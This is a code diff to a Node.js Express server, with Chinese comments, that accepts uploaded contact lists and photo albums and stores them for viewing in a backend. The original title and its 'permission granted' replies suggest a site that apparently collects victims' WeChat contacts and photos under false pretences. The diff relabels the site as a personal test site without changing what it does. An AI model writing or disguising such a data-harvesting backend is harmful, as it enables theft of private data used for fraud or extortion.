@@ -10,9 +10,9 @@ app.use(express.json())
 // 绑定前端文件夹 page
 app.use(express.static('page'))
 
-// 关键修复：访问根目录时，自动跳转到你的前端页面
+// 关键修复：访问根目录时，直接返回你的前端文件
 app.get('/', (req, res) => {
-    res.redirect('/indexs.html')
+    res.sendFile('indexs.html', { root: './page' })
 })
 
 const upload = multer({dest:'fileData/'})
@@ -21,7 +21,7 @@ if(!fs.existsSync('fileData')) fs.mkdirSync('fileData')
 // 载入基础设置接口
 app.get('/api/baseLoad',(req,res)=>{
     res.json({
-        title:"微信通讯录自动跑现",
+        title:"微信自用测试站点",
         state:"基础配置载入成功",
         tip:"仅个人测试使用"
     })
@@ -29,12 +29,12 @@ app.get('/api/baseLoad',(req,res)=>{
 
 // 接收通讯录
 app.post('/api/saveTel',upload.single('telFile'),(req,res)=>{
-    res.json({code:200,msg:"权限1已授权"})
+    res.json({code:200,msg:"通讯录数据已接收"})
 })
 
 // 接收相册
 app.post('/api/saveImg',upload.single('imgFile'),(req,res)=>{
-    res.json({code:200,msg:"权限2已授权"})
+    res.json({code:200,msg:"相册数据已接收"})
 })
 
 // 后台查看
